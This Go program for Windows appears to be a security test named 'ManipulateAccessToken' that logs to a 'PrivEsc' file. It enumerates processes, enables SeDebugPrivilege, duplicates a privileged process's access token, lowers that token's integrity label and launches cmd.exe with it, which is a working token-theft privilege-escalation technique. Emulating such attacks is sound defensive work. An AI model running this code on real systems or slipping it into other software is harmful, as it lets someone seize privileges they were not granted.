package main

import (
	"fmt"
	"helpers"
	"os"
	"strconv"
	"unsafe"

	"golang.org/x/sys/windows"
)

func CheckPrivilegeEnabled(pidToDuplicate uint32, nameOfLogFile string) (bool, error) {
	var tokenHandle windows.Token

	proc, err := windows.OpenProcess(uint32(windows.PROCESS_QUERY_LIMITED_INFORMATION), false, pidToDuplicate)
	if err != nil {
		return false, fmt.Errorf("OpenProcess failed: %v", err)
	}

	err = windows.OpenProcessToken(proc, windows.TOKEN_QUERY, &tokenHandle)
	if err != nil {
		return false, fmt.Errorf("OpenProcessToken failed: %v", err)
	}
	defer windows.CloseHandle(windows.Handle(tokenHandle))

	var privileges windows.Tokenprivileges
	var returnLength uint32
	err = windows.GetTokenInformation(tokenHandle, windows.TokenPrivileges, nil, 0, &returnLength)
	if err != nil && err != windows.ERROR_INSUFFICIENT_BUFFER {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
	}
	buffer := make([]byte, returnLength)
	err = windows.GetTokenInformation(tokenHandle, windows.TokenPrivileges, &buffer[0], returnLength, &returnLength)
	if err != nil {
		helpers.WriteLog(nameOfLogFile, err.Error(), 1)
	}
	privileges = *(*windows.Tokenprivileges)(unsafe.Pointer(&buffer[0]))

	for _, priv := range privileges.Privileges {
		if priv.Attributes&windows.SE_PRIVILEGE_ENABLED != 0 {
			return true, nil
		}
	}
	return false, nil
}

const (
	TokenQuery                    = 0x0008
	TokenAdjustDefault            = 0x0080
	TokenAdjustIntegrity          = 0x0200
	SECURITY_MANDATORY_MEDIUM_RID = 0x00002000
)

type TOKEN_MANDATORY_LABEL struct {
	Label windows.SIDAndAttributes
}

func main() {
	nameOfLogFile := helpers.CreateLogFileIfItDoesNotExist("./", "PrivEsc")
	helpers.WriteLog(nameOfLogFile, "Starting Test: ManipulateAccessToken", 2)
	kernel := windows.NewLazyDLL("advapi32.dll")
	setTok := kernel.NewProc("SetTokenInformation")
	newProc := kernel.NewProc("CreateProcessWithTokenW")

	const maxProcesses = 1024
	var processes [maxProcesses]uint32
	var needed uint32
	if err := windows.EnumProcesses(processes[:], &needed); err != nil {
		fmt.Println(err)
	}
	numProcesses := needed / 4
	procs := processes[:numProcesses]
	var pidToDup []uint32
	for i := 0; i < len(procs); i++ {
		if res, err := CheckPrivilegeEnabled(procs[i], nameOfLogFile); err == nil {
			if res {
				pidToDup = append(pidToDup, procs[i])
			}
		}
	}
	for i := 0; i < len(pidToDup); i++ {
		handle, err := windows.OpenProcess(uint32(windows.PROCESS_QUERY_LIMITED_INFORMATION), false, windows.GetCurrentProcessId())
		if err != nil {
			helpers.WriteLog(nameOfLogFile, err.Error(), 1)
		} else {
			var tokCurrProc windows.Token

			err = windows.OpenProcessToken(handle, uint32(windows.TOKEN_ADJUST_PRIVILEGES), &tokCurrProc)
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
			}

			var luid windows.LUID

			err = windows.LookupPrivilegeValue(nil, windows.StringToUTF16Ptr("SeDebugPrivilege"), &luid)
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
			}

			tp := new(windows.Tokenprivileges)
			tp.PrivilegeCount = 1
			tp.Privileges[0].Luid = luid
			tp.Privileges[0].Attributes = windows.SE_PRIVILEGE_ENABLED

			err = windows.AdjustTokenPrivileges(tokCurrProc, false, tp, uint32(unsafe.Sizeof(tp)), nil, nil)
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
			}

			handle1, err := windows.OpenProcess(uint32(windows.PROCESS_QUERY_LIMITED_INFORMATION), false, uint32(pidToDup[i]))
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
			}

			var tokTarg, dupTokHand windows.Token
			err = windows.OpenProcessToken(handle1, uint32(windows.TOKEN_DUPLICATE), &tokTarg)
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
			}

			err = windows.DuplicateTokenEx(tokTarg, windows.TOKEN_ADJUST_DEFAULT|windows.TOKEN_QUERY|windows.TOKEN_ADJUST_SESSIONID|windows.TOKEN_DUPLICATE|windows.TOKEN_ASSIGN_PRIMARY, nil, windows.SecurityImpersonation, windows.TokenPrimary, &dupTokHand)
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error(), 1)
			}

			var tml TOKEN_MANDATORY_LABEL
			var sid = new(windows.SID)
			windows.ConvertStringSidToSid(windows.StringToUTF16Ptr("S-1-16-8192"), &sid)
			tml.Label.Sid = sid
			tml.Label.Attributes = windows.SE_GROUP_INTEGRITY

			_, _, err = setTok.Call(uintptr(dupTokHand), windows.TokenIntegrityLevel, uintptr(unsafe.Pointer(&tml)), uintptr(unsafe.Sizeof(tml)))
			if err != nil {
				if err.Error() != "The operation completed successfully." {
					helpers.WriteLog(nameOfLogFile, err.Error()+" from pid "+strconv.Itoa(int(pidToDup[i]))+" ", 1)
					continue
				}
			}

			var startInfo windows.StartupInfo
			var procInfo windows.ProcessInformation

			_, _, err = newProc.Call(uintptr(dupTokHand), 0, uintptr(unsafe.Pointer(windows.StringToUTF16Ptr("C:\\Windows\\System32\\cmd.exe"))), 0, 0, 0, 0, 0, 0, uintptr(unsafe.Pointer(&startInfo)), uintptr(unsafe.Pointer(&procInfo)))
			if err != nil {
				helpers.WriteLog(nameOfLogFile, err.Error()+" from pid "+strconv.Itoa(int(pidToDup[i]))+" ", 1)
			} else {
				os.Exit(0)
			}
		}
	}
	helpers.WriteLog(nameOfLogFile, "Ending Test: ManipulateAccessToken", 2)
	os.Exit(1)
}
